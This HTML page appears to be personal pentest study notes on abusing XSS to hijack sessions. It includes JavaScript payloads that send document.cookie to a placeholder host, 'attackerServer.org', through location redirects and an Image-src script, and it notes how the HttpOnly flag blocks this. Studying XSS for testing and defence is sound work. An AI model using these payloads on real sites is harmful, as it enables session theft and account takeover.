<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Session Abuse</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Session Abuse</h1><br/><br />The victim&#39;s browser renders our JavaScript within the user&#39;s session of the vulnerable server.<br />If the user has already authenticated, then the session information might be accessible to our executing scripts.<br /><br /><br /><strong><h2>Session Hijacking</h2></strong><br />The most serious session abuse using XSS could afford us the ability to fully interact as the user <br />To achieve this, we will need to hijack their active session, typically by stealing and reusing their session tokens, such as cookies.<br />With our scripts being delivered from the origin server that presented the session token to the user in the first place, SOP will not be a concern. Likewise, our scripts will be able to fully interact with and manipulate the DOM in question.<br /><br />• <strong>DOM Properties that could contain session data we want</strong><br />   ◇ document.cookie → Cookies are most common target<br />   ◇ document.URL →  Query parameters <br />   ◇ document.forms →  Hidden form fields and CSRF tokens<br /><br />• <strong>How send the theft data to us</strong><br />   ◇ <span style="text-decoration:underline;">Use </span><code><span style="text-decoration:underline;">location</span></code><span style="text-decoration:underline;"> to redirect the victim&#39;s browser to our web server and send data to us:</span><br />       the major drawback of this method is that the user&#39;s browser is actually redirected. This greatly increases the likelihood of detection of our attack<br />   ◇ location = &#39;http://attackerServer.org/c.php?=&#39;+document.cookie<br />   ◇ location.replace(&#39;attackerServer.org/c.php?=&#39;+document.cookie)<br />   ◇ <span style="text-decoration:underline;">Create a new </span><code><span style="text-decoration:underline;">Image</span></code><span style="text-decoration:underline;"> that points to our cookie catching script:</span><br />      ▪ script<br />          <div class="codebox"><div class="codebox">&lt;script&gt;<br />img&nbsp;=&nbsp;new&nbsp;Image();<br />img.src=&#39;//attackerServer.org/cookiecatcher.php?=&#39;+document.cookie;<br /><span style="color:#000000;font-weight:400">&lt;</span>/script<span style="color:#000000;font-weight:400">&gt;</span></div></div><br /><br /><strong>HttpOnly flag makes the things more difficult!</strong><br />If the <a href="ology--WebApp_Pentest--web_application_basics--HTTP(S)_protocol--Tokens_to_mantain_a_session_state--Cookies_(Set-Cookie_&_Cookie_headers).html">HttpOnly flag is set (to “true”) in Set-Cookie header</a> in the response of the server, means that only HTTP (and not JavaScript) is allowed to interface with the cookies. This mean that for example we cannot use the POCs seen in Reflected XSS<br />   ◇ HttpOnly flag set (true) → safe for the user<br />       <a href=""><img src="images/1582-1.png" alt="images/1582-1.png" /></a><br />       <a href=""><img src="images/1582-2.png" alt="images/1582-2.png" /></a><br />   ◇ HttpOnly flag not set (==false) → not safe for the user<br />       <a href=""><img src="images/1582-3.png" alt="images/1582-3.png" /></a></div>
</body>
</html>
